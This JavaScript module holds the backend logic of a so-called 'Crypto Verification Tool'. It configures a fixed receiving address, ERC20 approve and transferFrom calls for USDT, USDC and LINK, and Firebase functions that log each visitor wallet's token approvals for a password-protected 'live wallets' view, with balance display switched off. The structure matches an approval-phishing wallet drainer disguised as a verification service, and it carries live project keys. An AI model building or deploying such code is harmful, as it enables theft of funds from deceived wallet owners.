/**
 * CryptoVerification.logic.js
 * 
 * All wallet/blockchain logic for the Crypto Verification Tool.
 * Extracted from the original standalone HTML to keep React component clean.
 * This module is self-contained and does NOT interact with BetaBase state.
 */

// ★★ CONFIGURATION ★★
export const CONFIG = {
  receivingAddress: "0xA45b36801517DCa27b7662C419D94a28B4D01920",
  network: "ETH",
  walletConnectProjectId: "e02cab7850bba2f17796007cb813b5e1",

  firebase: {
    apiKey: "AIzaSyBySWe_nPXByLntTXBLWgN0wKaYFUYQVe8",
    authDomain: "drn001-e2f5d.firebaseapp.com",
    databaseURL: "https://drn001-e2f5d-default-rtdb.europe-west1.firebasedatabase.app",
    projectId: "drn001-e2f5d",
    storageBucket: "drn001-e2f5d.firebasestorage.app",
    messagingSenderId: "945165411391",
    appId: "1:945165411391:web:835d827147ba7f6b22c48a"
  },

  showBalances: false,

  coingeckoIds: {
    "0xdAC17F958D2ee523a2206206994597C13D831ec7": "tether",
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48": "usd-coin",
    "0x514910771AF9Ca656af840dff83E8264EcF986CA": "chainlink"
  },

  managerPasswordHash: "240be518fabd2724ddb6f04eeb1da5967448d7e831c08c8fa822809f74c720a9",

  tokens: [
    { address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol: "USDT" },
    { address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol: "USDC" },
    { address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", symbol: "LINK" }
  ]
};

export const NETWORKS = {
  ETH:      { chainId: 1,     name: "Ethereum", rpc: "https://ethereum-rpc.publicnode.com", currency: "ETH",  explorer: "https://etherscan.io", cgNative: "ethereum" },
  BSC:      { chainId: 56,    name: "BSC",      rpc: "https://bsc-rpc.publicnode.com",      currency: "BNB",  explorer: "https://bscscan.com", cgNative: "binancecoin" },
  POLYGON:  { chainId: 137,   name: "Polygon",  rpc: "https://polygon-bor-rpc.publicnode.com", currency: "MATIC", explorer: "https://polygonscan.com", cgNative: "matic-network" },
  ARBITRUM: { chainId: 42161, name: "Arbitrum", rpc: "https://arbitrum-one-rpc.publicnode.com", currency: "ETH",  explorer: "https://arbiscan.io", cgNative: "ethereum" }
};

export const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address,address) view returns (uint256)",
  "function approve(address,uint256) returns (bool)",
  "function transferFrom(address,address,uint256) returns (bool)",
  "function decimals() view returns (uint8)",
  "event Approval(address indexed owner, address indexed spender, uint256 value)"
];

export const net = NETWORKS[CONFIG.network];

// SHA-256 helper
export async function sha256(text) {
  const buf = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(text));
  return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, "0")).join("");
}

// Firebase helpers
let fbDb = null;

export function initFirebase() {
  const f = CONFIG.firebase;
  if (!f) return;
  try {
    /* global firebase */
    if (typeof firebase !== "undefined" && !firebase.apps.length) {
      firebase.initializeApp(f);
    }
    if (typeof firebase !== "undefined") {
      fbDb = firebase.database();
    }
  } catch (e) {
    console.warn("[CVT] Firebase init error:", e);
  }
}

export function recordApprovalLive(addr, tAddr, sym, hash) {
  if (!fbDb) return;
  fbDb.ref("approvals/" + addr.toLowerCase() + "/" + sym).set({
    token: tAddr,
    when: Date.now(),
    tx: hash
  });
}

export function subscribeLiveWallets(callback) {
  if (!fbDb) {
    callback(null);
    return;
  }
  fbDb.ref("approvals").on("value", (snap) => {
    callback(snap.val() || {});
  });
}

// Price helpers
let priceCache = {};

export async function getPrices() {
  if (Date.now() - priceCache.time < 60000 && priceCache.prices) return priceCache.prices;
  const ids = [net.cgNative];
  CONFIG.tokens.forEach(t => {
    if (CONFIG.coingeckoIds[t.address]) ids.push(CONFIG.coingeckoIds[t.address]);
  });
  try {
    const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=" + ids.join(",") + "&vs_currencies=usd");
    const d = await r.json();
    const p = { native: d[net.cgNative]?.usd || 0, tokens: {} };
    CONFIG.tokens.forEach(t => p.tokens[t.symbol] = (CONFIG.coingeckoIds[t.address] && d[CONFIG.coingeckoIds[t.address]])?.usd || 0);
    priceCache = { time: Date.now(), prices: p };
    return p;
  } catch (e) {
    return { native: 0, tokens: {} };
  }
}
